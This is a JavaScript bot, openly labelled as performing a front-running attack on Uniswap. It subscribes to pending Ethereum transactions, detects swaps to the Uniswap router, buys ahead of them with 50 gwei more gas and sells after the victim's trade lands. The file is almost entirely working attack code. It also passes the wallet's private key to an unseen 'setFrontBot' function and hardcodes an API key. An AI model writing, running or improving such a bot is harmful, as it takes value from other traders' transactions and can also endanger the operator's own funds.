/**
 * Perform a front-running attack on uniswap
*/

//const fs = require('fs');
var Web3 = require('web3');
var abiDecoder = require('abi-decoder');
var colors = require("colors");
var Tx = require('ethereumjs-tx').Transaction;
var axios = require('axios');
var sleep = require('sleep');

const { NETWORK, UNISWAP_ROUTER_ADDRESS, UNISWAP_FACTORY_ADDRESS, UNISWAP_ROUTER_ABI,
    UNISWAP_FACTORY_ABI, UNISWAP_POOL_ABI, HTTP_PROVIDER_LINK,
    WEBSOCKET_PROVIDER_LINK, HTTP_PROVIDER_LINK_TEST } = require('./constants.js');
const { setBotAddress, getBotAddress, FRONT_BOT_ADDRESS, botABI } = require('./bot.js');
const { PRIVATE_KEY, TOKEN_ADDRESS, AMOUNT, LEVEL } = require('./env.js');

const INPUT_TOKEN_ADDRESS = (NETWORK == 'mainnet') ? '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2' : '0xc778417E063141139Fce010982780140Aa0cD5Ab';
const WETH_TOKEN_ADDRESS = (NETWORK == 'mainnet') ? '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2' : '0xc778417E063141139Fce010982780140Aa0cD5Ab';

var eth_info;
var input_token_info;
var out_token_info;
var pool_info;
var gas_price_info;

var web3;
var web3Ts;
var web3Ws;
var uniswapRouter;
var uniswapFactory;

// one gwei
const ONE_GWEI = 1e9;

var buy_finished = false;
var sell_finished = false;
var buy_failed = false;
var sell_failed = false;
var attack_started = false;

var succeed = false;
var subscription;

async function createWeb3() {
    try {
        web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK));
        web3Ts = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK_TEST));
        web3Ws = new Web3(new Web3.providers.WebsocketProvider(WEBSOCKET_PROVIDER_LINK));

        uniswapRouter = new web3.eth.Contract(UNISWAP_ROUTER_ABI, UNISWAP_ROUTER_ADDRESS);
        uniswapFactory = new web3.eth.Contract(UNISWAP_FACTORY_ABI, UNISWAP_FACTORY_ADDRESS);
        abiDecoder.addABI(UNISWAP_ROUTER_ABI);

        return true;
    } catch (error) {
        console.error(error);
        return false;
    }
}

async function main() {

    try {
        var ret = await createWeb3();

        const addr_str = PRIVATE_KEY;
        const user_wallet = web3.eth.accounts.privateKeyToAccount(addr_str);
        const out_token_address = TOKEN_ADDRESS;
        const amount = AMOUNT;
        const level = LEVEL;

        ret = await preparedAttack(INPUT_TOKEN_ADDRESS, out_token_address, user_wallet, addr_str, amount, level);
        if (ret == false) {
            process.exit();
        }

        await updatePoolInfo();
        var outputtoken = await uniswapRouter.methods.getAmountOut(((amount * 1.2) * (10 ** 18)).toString(), pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();

        await approve(gas_price_info.high, outputtoken, out_token_address, user_wallet);

        log_str = '***** Tracking more ' + (pool_info.attack_volumn / (10 ** input_token_info.decimals)).toFixed(5) + ' ' + input_token_info.symbol + '  Exchange on Uniswap *****'
        console.log(log_str.green);

        // get pending transactions
        subscription = web3Ws.eth.subscribe('pendingTransactions', function (error, result) {
        }).on("data", async function (transactionHash) {
            let transaction = await web3.eth.getTransaction(transactionHash);
            if (transaction != null && transaction['to'] == UNISWAP_ROUTER_ADDRESS) {
                await handleTransaction(transaction, out_token_address, user_wallet, amount, level);
            }

            if (succeed) {
                console.log("The bot finished the attack.");
                process.exit();
            }
        })

    } catch (error) {

        if (error.data != null && error.data.see === 'https://infura.io/dashboard') {
            console.log('Daily request count exceeded, Request rate limited'.yellow);
            console.log('Please insert other API Key');
        } else {
            console.log('Unknown Handled Error');
            console.log(error);
        }

        process.exit();
    }
}

async function handleTransaction(transaction, out_token_address, user_wallet, amount, level) {

    if (await triggersFrontRun(transaction, out_token_address, amount, level)) {
        subscription.unsubscribe();
        console.log('Perform front running attack...');

        let gasPrice = parseInt(transaction['gasPrice']);
        let newGasPrice = gasPrice + 50 * ONE_GWEI;

        var estimatedInput = ((amount * 0.999) * (10 ** 18)).toString();
        var realInput = (amount * (10 ** 18)).toString();
        var gasLimit = (300000).toString();

        await updatePoolInfo();

        var outputtoken = await uniswapRouter.methods.getAmountOut(estimatedInput, pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
        swap(newGasPrice, gasLimit, outputtoken, realInput, 0, out_token_address, user_wallet, transaction);

        console.log("wait until the honest transaction is done...", transaction['hash']);

        while (await isPending(transaction['hash'])) {
        }

        if (buy_failed) {
            succeed = false;
            return;
        }

        console.log('Buy succeed:')

        //Sell
        await updatePoolInfo();
        var outputeth = await uniswapRouter.methods.getAmountOut(outputtoken, pool_info.output_volumn.toString(), pool_info.input_volumn.toString()).call();
        outputeth = outputeth * 0.999;

        await swap(newGasPrice, gasLimit, outputtoken, outputeth, 1, out_token_address, user_wallet, transaction);

        console.log('Sell succeed');
        succeed = true;
    }
}

async function approve(gasPrice, outputtoken, out_token_address, user_wallet) {
    var allowance = await out_token_info.token_contract.methods.allowance(user_wallet.address, UNISWAP_ROUTER_ADDRESS).call();

    console.log('Current Allwance: ', allowance / (10 ** out_token_info.decimals));

    var min_allowance = 100 * (10 ** out_token_info.decimals);
    var max_allowance = 10000 * (10 ** out_token_info.decimals);

    if (outputtoken > max_allowance)
        max_allowance = outputtoken;

    if (allowance <= min_allowance) {
        var approveTX = {
            from: user_wallet.address,
            to: out_token_address,
            gas: 50000,
            gasPrice: gasPrice * ONE_GWEI,
            data: out_token_info.token_contract.methods.approve(UNISWAP_ROUTER_ADDRESS, max_allowance).encodeABI()
        }
        var signedTX = await user_wallet.signTransaction(approveTX);
        var result = await web3.eth.sendSignedTransaction(signedTX.rawTransaction);

        console.log('Approved Token')
    }

    return;
};


async function preparedAttack(input_token_address, out_token_address, user_wallet, address, amount, level) {
    //    try {

    await setFrontBot(address, user_wallet);

    // } catch (error) {

    //   if(error.data.see == 'https://infura.io/dashboard')
    //   {
    //      console.log('Daily request count exceeded, Request rate limited'.yellow);
    //      console.log('Please insert other API Key');
    //   } 

    //   return false;
    // }

    var log_str = '***** Your Wallet Balance *****'
    console.log(log_str.green);

    log_str = 'wallet address:\t' + user_wallet.address;
    console.log(log_str.white);

    input_token_info = await getEthInfo(user_wallet, address);
    log_str = (input_token_info.balance / (10 ** input_token_info.decimals)).toFixed(5) + '\t' + input_token_info.symbol;
    console.log(log_str);

    // if(input_token_info.balance < (amount+0.08) * (10**18)) {

    //     console.log("INSUFFICIENT_BALANCE!".yellow);
    //     log_str = 'Your wallet balance must be more ' + amount + input_token_info.symbol + '(+0.08ETH:GasFee) ';
    //     console.log(log_str.red)

    //     return false;
    // }

    const OUT_TOKEN_ABI_REQ = (NETWORK == 'mainnet') ? 'https://api.etherscan.io/api?module=contract&action=getabi&address='
        + out_token_address + '&apikey=33Y681VVRYXX7J2XCRX3CYYUSWPQ6EPQ9K' : 'https://api-ropsten.etherscan.io/api?module=contract&action=getabi&address='
        + out_token_address + '&apikey=33Y681VVRYXX7J2XCRX3CYYUSWPQ6EPQ9K';

    //out token balance
    out_token_info = await getTokenInfo(out_token_address, OUT_TOKEN_ABI_REQ, user_wallet);
    if (out_token_info == null) {
        return false;
    }

    log_str = (out_token_info.balance / (10 ** out_token_info.decimals)).toFixed(5) + '\t' + out_token_info.symbol;
    console.log(log_str.white);

    //check pool info
    if (await getPoolInfo(WETH_TOKEN_ADDRESS, out_token_address, level) == false)
        return false;

    gas_price_info = await getCurrentGasPrices();

    log_str = '=================== Prepared to attack ' + input_token_info.symbol + '-' + out_token_info.symbol + ' pair ==================='
    console.log(log_str.red);

    return true;
}